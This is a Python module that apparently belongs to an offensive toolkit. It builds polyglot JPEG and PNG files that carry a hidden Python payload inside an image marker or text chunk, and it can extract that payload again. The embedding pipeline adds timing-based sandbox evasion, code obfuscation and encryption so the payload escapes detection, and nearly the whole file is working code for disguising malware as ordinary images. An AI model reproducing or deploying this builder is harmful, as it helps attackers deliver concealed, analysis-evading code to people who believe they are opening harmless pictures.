import os
import zlib
import random
import struct
import imghdr
from typing import Optional, Union, Tuple
from PIL import Image
from io import BytesIO
from core.crypter import Crypter
from core.obfuscator import CodeObfuscator

class PolyglotBuilder:
    def __init__(self):
        self.crypter = Crypter()
        self.obfuscator = CodeObfuscator()
        
    def create_polyglot(self, payload_code: str, carrier_file: str) -> bytes:
        """Create a polyglot file that combines the payload with a carrier image
        
        Args:
            payload_code: The Python code to embed
            carrier_file: Path to the carrier image file
            
        Returns:
            bytes: The complete polyglot file data
        """
        # First validate and optimize the image
        img_type, img_data = self._prepare_image(carrier_file)
        if not img_type or not img_data:
            raise ValueError("Invalid or unsupported image file")
            
        # Obfuscate and encrypt the payload
        encrypted_payload = self._prepare_payload(payload_code)
        
        # Create polyglot based on image type
        if img_type == 'jpeg':
            return self._create_jpeg_polyglot(encrypted_payload, img_data)
        elif img_type == 'png':
            return self._create_png_polyglot(encrypted_payload, img_data)
        else:
            raise ValueError(f"Unsupported image type: {img_type}")
            
    def _prepare_image(self, image_path: str) -> Tuple[Optional[str], Optional[bytes]]:
        """Prepare and optimize the carrier image
        
        Args:
            image_path: Path to the image file
            
        Returns:
            tuple: (image_type, optimized_image_data)
        """
        try:
            # Detect image type
            img_type = imghdr.what(image_path)
            if img_type not in ['jpeg', 'png']:
                return None, None
                
            # Open and optimize image
            with Image.open(image_path) as img:
                # Convert to RGB if necessary
                if img.mode != 'RGB':
                    img = img.convert('RGB')
                    
                # Optimize
                buffer = BytesIO()
                if img_type == 'jpeg':
                    img.save(buffer, format='JPEG', quality=85, optimize=True)
                else:  # PNG
                    img.save(buffer, format='PNG', optimize=True)
                    
                return img_type, buffer.getvalue()
                
        except Exception as e:
            print(f"Error preparing image: {e}")
            return None, None
            
    def _prepare_payload(self, payload_code: str) -> bytes:
        """Prepare the payload for embedding
        
        Args:
            payload_code: The Python code to embed
            
        Returns:
            bytes: The prepared payload
        """
        # Add sandbox evasion
        obfuscated_code = self.obfuscator.add_timing_evasion(payload_code)
        
        # Additional obfuscation
        obfuscated_code = self.obfuscator.obfuscate_code(obfuscated_code)
        
        # Encrypt
        return self.crypter.encrypt(obfuscated_code)
        
    def _create_jpeg_polyglot(self, payload: bytes, image_data: bytes) -> bytes:
        """Create a JPEG polyglot file
        
        Args:
            payload: The encrypted payload
            image_data: The JPEG image data
            
        Returns:
            bytes: The complete polyglot file
        """
        output = bytearray()
        
        # JPEG structure:
        # SOI (FF D8) + APP0 + payload + remaining data
        
        # Add SOI marker
        output.extend(image_data[:2])  # FF D8
        
        # Add our custom APP marker
        marker = random.randint(0xE0, 0xEF)  # Random APP marker
        marker_data = bytes([0xFF, marker])
        length = len(payload) + 2  # +2 for length field
        length_data = struct.pack('>H', length)
        
        output.extend(marker_data)
        output.extend(length_data)
        output.extend(payload)
        
        # Add remaining image data
        output.extend(image_data[2:])
        
        return bytes(output)
        
    def _create_png_polyglot(self, payload: bytes, image_data: bytes) -> bytes:
        """Create a PNG polyglot file
        
        Args:
            payload: The encrypted payload
            image_data: The PNG image data
            
        Returns:
            bytes: The complete polyglot file
        """
        output = bytearray()
        
        # PNG structure:
        # Signature + IHDR chunk + custom chunk + remaining chunks
        
        # Add PNG signature and IHDR
        png_sig_len = 8
        output.extend(image_data[:png_sig_len])
        
        # Find IHDR chunk
        ihdr_start = png_sig_len
        ihdr_length = struct.unpack('>I', image_data[ihdr_start:ihdr_start+4])[0]
        ihdr_end = ihdr_start + 12 + ihdr_length  # 12 = 4(length) + 4(type) + 4(CRC)
        output.extend(image_data[ihdr_start:ihdr_end])
        
        # Add our custom chunk
        chunk_type = b'tEXt'  # Use standard text chunk type
        chunk_data = b'Comment\0' + payload  # Add standard keyword
        chunk_length = len(chunk_data)
        
        output.extend(struct.pack('>I', chunk_length))  # Length
        output.extend(chunk_type)  # Chunk type
        output.extend(chunk_data)  # Data
        
        # Calculate and add CRC
        crc = zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF
        output.extend(struct.pack('>I', crc))
        
        # Add remaining chunks
        output.extend(image_data[ihdr_end:])
        
        return bytes(output)
        
    def extract_payload(self, polyglot_data: bytes) -> Optional[str]:
        """Extract and decrypt payload from polyglot file
        
        Args:
            polyglot_data: The polyglot file data
            
        Returns:
            str: The extracted payload code, or None if extraction fails
        """
        try:
            # Detect format
            if polyglot_data.startswith(b'\xFF\xD8'):  # JPEG
                return self._extract_jpeg_payload(polyglot_data)
            elif polyglot_data.startswith(b'\x89PNG'):  # PNG
                return self._extract_png_payload(polyglot_data)
            else:
                return None
                
        except Exception as e:
            print(f"Error extracting payload: {e}")
            return None
            
    def _extract_jpeg_payload(self, data: bytes) -> Optional[str]:
        """Extract payload from JPEG file"""
        try:
            pos = 2  # Skip SOI
            while pos < len(data):
                if data[pos] != 0xFF:  # Not a marker
                    return None
                    
                marker = data[pos + 1]
                if 0xE0 <= marker <= 0xEF:  # APP marker
                    length = struct.unpack('>H', data[pos+2:pos+4])[0]
                    payload = data[pos+4:pos+2+length]
                    return self.crypter.decrypt(payload)
                    
                pos += 2 + struct.unpack('>H', data[pos+2:pos+4])[0]
                
            return None
            
        except Exception as e:
            print(f"Error extracting JPEG payload: {e}")
            return None
            
    def _extract_png_payload(self, data: bytes) -> Optional[str]:
        """Extract payload from PNG file"""
        try:
            pos = 8  # Skip signature
            while pos < len(data):
                length = struct.unpack('>I', data[pos:pos+4])[0]
                chunk_type = data[pos+4:pos+8]
                
                if chunk_type == b'tEXt':
                    chunk_data = data[pos+8:pos+8+length]
                    if chunk_data.startswith(b'Comment\0'):
                        payload = chunk_data[8:]  # Skip "Comment\0"
                        return self.crypter.decrypt(payload)
                        
                pos += 12 + length  # 12 = 4(length) + 4(type) + 4(CRC)
                
            return None
            
        except Exception as e:
            print(f"Error extracting PNG payload: {e}")
            return None
